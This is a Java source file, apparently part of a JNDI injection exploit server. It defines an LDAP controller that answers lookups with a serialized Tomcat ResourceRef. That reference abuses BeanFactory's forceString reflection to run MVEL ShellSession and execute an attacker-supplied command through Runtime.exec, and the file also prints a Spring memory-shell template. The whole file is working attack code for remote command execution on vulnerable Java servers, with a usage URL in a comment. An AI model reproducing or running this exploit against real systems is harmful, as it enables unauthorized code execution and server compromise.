package com.feihong.ldap.controllers;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.template.SpringMemshellTemplate;
import com.feihong.ldap.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/*
ldap://x.x.x.x:1389/xstream

Ref: https://b1ue.cn/archives/529.html
 */

@LdapMapping(uri = { "/tomcatmvel" })
public class TomcatMVELController implements LdapController {

    private PayloadType type;
    private String[] params;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("[+] Sending LDAP ResourceRef result for " + base);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = getResourceRefBytomcatMVEL(params[0]);

        e.addAttribute("javaSerializedData", Util.serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        System.out.println("[+] Done Sending LDAP ResourceRef result");
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try{
            int firstIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            if(secondIndex < 0) secondIndex = base.length();

            //因为我对 grovvy 的语法完全不懂，所以目前只支持执行命令这一种形式的 PayloadType
            String payloadType = base.substring(firstIndex + 1, secondIndex);
            if(payloadType.equalsIgnoreCase("command")){
                type = PayloadType.valueOf("command");
                System.out.println("[+] Paylaod: " + type);
            }else{
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + payloadType);
            }

            String cmd = Util.getCmdFromBase(base);
            System.out.println("[+] Command: " + cmd);
            params = new String[]{cmd};
        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    private static ResourceRef getResourceRefBytomcatMVEL(String cmd){
        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=exec"));
        ref.add(new StringRefAddr("a",
                "push Runtime.getRuntime().exec('" + cmd + "');"));
        return ref;
    }


    public static void main(String[] args) throws Exception {
        Class clazz = SpringMemshellTemplate.class;
        String classCode = Util.getClassCode(clazz);
        System.out.println(classCode);
    }
}
